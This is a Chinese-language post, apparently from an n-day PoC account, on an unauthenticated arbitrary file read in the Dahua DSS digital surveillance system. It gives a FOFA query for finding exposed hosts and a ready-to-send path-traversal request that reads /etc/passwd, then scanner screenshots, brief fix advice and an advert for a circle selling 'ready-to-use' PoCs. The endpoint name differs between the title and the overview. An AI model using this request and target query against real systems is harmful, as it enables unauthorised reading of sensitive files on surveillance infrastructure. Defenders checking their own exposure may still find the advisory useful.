#  大华DSS数字监控系统attachment_downloadAtt.action任意文件读取(XVE-2024-34436)   
Superhero  Nday Poc   2024-12-19 23:46  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
大华DSS数字监控系统是一个在通用安防视频监控系统基础上设计开发的系统，专为各类企业和组织提供高效、稳定且全面的视频监控解决方案，旨在提升安全防护能力，优化运营管理。支持高清视频流处理，确保图像清晰度，提高监控质量。内置多种智能分析算法，如人脸识别、行为分析、异常检测等，提高预警效率。支持移动终端访问，用户可以随时随地查看监控画面。采用加密技术，保护数据安全，防止非法入侵。典型组网结构包括前端设备（摄像头）、后端服务器、存储设备、网络设备以及客户端软件。系统基于模块化设计，易于扩展和维护。总体层次结构通常包括基层监控节点、区域中心、总中心等多级架构。同时，系统支持多级中心互联，实现远程监控和管理。  
**01******  
  
**漏洞概述**  
  
  
大华DSS数字监控系统 attachment_downloadByUrlAtt.action接口存在任意文件读取漏洞，未经  
身份验证  
的远程攻击者可以利用此漏洞获取系统内部敏感文件信息，使系统处于极不安全的状态。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
app="dahua-DSS"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLMp9hDiaCWFicYGevLiaiaKjtqRq8icSibjHkMLEzWuZQSwUCWr369Bp38QZJRibRHxMrrht6hDZLxYkmuw/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
GET /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLMp9hDiaCWFicYGevLiaiaKjtqkrkA6ULLdsHBKj3u2tNTIbySQtumXIniaTwicBzqgtgoM96FdgF6DEug/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLMp9hDiaCWFicYGevLiaiaKjtq0YUmvePA0EWXnGCedAia09gk3E5l3ibLhaHB0zzQicAXJibicTrZPJic91jA/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLMp9hDiaCWFicYGevLiaiaKjtqUhsibibeURHGCszANQunDHIZB5Ls6oF1wCib4ADKicygGnMZEyQbHibHcCg/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLMp9hDiaCWFicYGevLiaiaKjtqBUdXv3EOJ1mhdL08gECiclvj3hNVkdQopMV07oJeZZBd0bexZ8ibcGWw/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、  
目前已提供解决方案，请关注厂商主页更新：https://www.dahuatech.com/  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
